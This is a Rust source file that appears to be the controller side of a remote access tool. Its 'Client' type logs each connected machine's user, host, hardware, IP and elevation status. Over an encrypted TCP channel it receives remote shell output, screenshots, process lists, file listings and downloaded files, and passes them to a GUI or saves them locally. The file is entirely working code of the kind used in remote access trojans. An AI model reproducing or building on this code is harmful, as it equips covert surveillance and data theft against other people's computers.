use std::net::TcpStream;
use std::sync::{ Arc, Mutex };
use base64::{ engine::general_purpose, Engine as _ };
use tauri::{ AppHandle, Manager };

use common::buffers::{ read_buffer, write_buffer };
use common::commands::{ Command, File };
use rand_chacha::ChaCha20Rng;

#[derive(Debug)]
pub struct Client {
    tauri_handle: Arc<Mutex<AppHandle>>,
    write_stream: TcpStream,
    read_stream: Arc<Mutex<TcpStream>>,
    secret: Vec<u8>,

    nonce_read: ChaCha20Rng,
    nonce_write: ChaCha20Rng,

    username: String,
    hostname: String,
    os: String,
    ram: String,
    cpu: String,
    gpus: Vec<String>,
    storage: Vec<String>,
    displays: i32,
    ip: String,

    is_elevated: bool,

    disconnected: Arc<Mutex<bool>>,

    pub is_handled: bool,

    pub shell_started: bool,

    files: Arc<Mutex<Vec<File>>>,
    current_path: Arc<Mutex<String>>,
}

impl Client {
    pub fn new(
        tauri_handle: Arc<Mutex<AppHandle>>,
        write_stream: TcpStream,
        secret: Vec<u8>,
        nonce_read: ChaCha20Rng,
        nonce_write: ChaCha20Rng,
        username: String,
        hostname: String,
        os: String,
        ram: String,
        cpu: String,
        gpus: Vec<String>,
        storage: Vec<String>,
        displays: i32,
        ip: String,
        is_elevated: bool
    ) -> Self {
        Client {
            tauri_handle,
            write_stream: write_stream.try_clone().unwrap(),
            read_stream: Arc::new(Mutex::new(write_stream.try_clone().unwrap())),
            secret,
            nonce_read,
            nonce_write,
            username,
            hostname,
            os,
            ram,
            cpu,
            gpus,
            storage,
            displays,
            ip,
            is_elevated,
            disconnected: Arc::new(Mutex::new(false)),
            is_handled: false,
            shell_started: false,
            files: Arc::new(Mutex::new(Vec::new())),
            current_path: Arc::new(Mutex::new("".to_string())),
        }
    }

    pub fn write_buffer(&mut self, command: Command, secret: &Option<Vec<u8>>) {
        write_buffer(&mut self.write_stream, command, &secret, Some(&mut self.nonce_write));
    }

    pub fn handle_client(&mut self) {
        println!("handling the client");
        let username_clone = self.username.clone();
        let stream_clone = Arc::clone(&self.read_stream);
        let files = Arc::clone(&self.files);
        let current_path = Arc::clone(&self.current_path);
        let disconnected = Arc::clone(&self.disconnected);
        let tauri_handle = Arc::clone(&self.tauri_handle);
        let secret = self.get_secret();
        let mut nonce_read = self.nonce_read.clone();

        println!("started looping");
        std::thread::spawn(move || {
            loop {
                println!("lopping");
                let mut locked_stream = stream_clone.lock().unwrap();
                let received_data = read_buffer(
                    &mut locked_stream,
                    &Some(secret.clone()),
                    Some(&mut nonce_read)
                );

                match received_data {
                    Ok(received) => {
                        match received {
                            Command::ProcessList(process_list) => {
                                let _ = tauri_handle
                                    .lock()
                                    .unwrap()
                                    .emit_all("process_list", process_list);
                            }
                            Command::ShellOutput(shell_output) => {
                                let _ = tauri_handle
                                    .lock()
                                    .unwrap()
                                    .emit_all("client_shellout", shell_output);
                            }
                            Command::ScreenshotResult(screenshot) => {
                                let base64_img = general_purpose::STANDARD.encode(screenshot);
                                let _ = tauri_handle
                                    .lock()
                                    .unwrap()
                                    .emit_all("client_screenshot", base64_img);
                            }
                            Command::DisksResult(disks) => {
                                for disk in disks {
                                    files
                                        .lock()
                                        .unwrap()
                                        .push(File {
                                            file_type: "dir".to_string(),
                                            name: format!("{}:\\", disk),
                                        });
                                }
                            }
                            Command::CurrentFolder(folder) => {
                                *current_path.lock().unwrap() = folder;
                            }
                            Command::FileList(files_list) => {
                                let mut files = files.lock().unwrap();
                                files.clear();
                                for file in files_list {
                                    files.push(file);
                                }
                            }
                            Command::DonwloadFileResult(data) => {
                                let _ = std::fs::write(data.name, data.data);
                            }
                            _ => {
                                println!("Received unknown or unhandled data.");
                            }
                        }
                    }
                    Err(_) => {
                        let _ = tauri_handle
                            .lock()
                            .unwrap()
                            .emit_all("client_disconnected", username_clone);
                        println!("Disconnected!");
                        break;
                    }
                }
            }
            *disconnected.lock().unwrap() = true;
        });
    }

    pub fn get_username(&self) -> String {
        self.username.clone()
    }

    pub fn get_hostname(&self) -> String {
        self.hostname.clone()
    }

    pub fn get_os(&self) -> String {
        self.os.clone()
    }

    pub fn get_ram(&self) -> String {
        self.ram.clone()
    }

    pub fn get_cpu(&self) -> String {
        self.cpu.clone()
    }

    pub fn get_gpus(&self) -> Vec<String> {
        self.gpus.clone()
    }

    pub fn get_storage(&self) -> Vec<String> {
        self.storage.clone()
    }

    pub fn get_displays(&self) -> i32 {
        self.displays
    }

    pub fn get_ip(&self) -> String {
        self.ip.clone()
    }

    pub fn is_elevated(&self) -> bool {
        self.is_elevated
    }

    pub fn is_disconnect(&self) -> bool {
        *self.disconnected.lock().unwrap()
    }

    pub fn get_files(&self) -> Vec<File> {
        self.files.lock().unwrap().clone()
    }

    pub fn reset_files(&self) {
        self.files.lock().unwrap().clear();
    }

    pub fn get_path(&self) -> String {
        self.current_path.lock().unwrap().clone()
    }

    pub fn reset_path(&self) {
        self.current_path.lock().unwrap().clear();
    }

    pub fn get_secret(&self) -> Vec<u8> {
        self.secret.clone()
    }
}
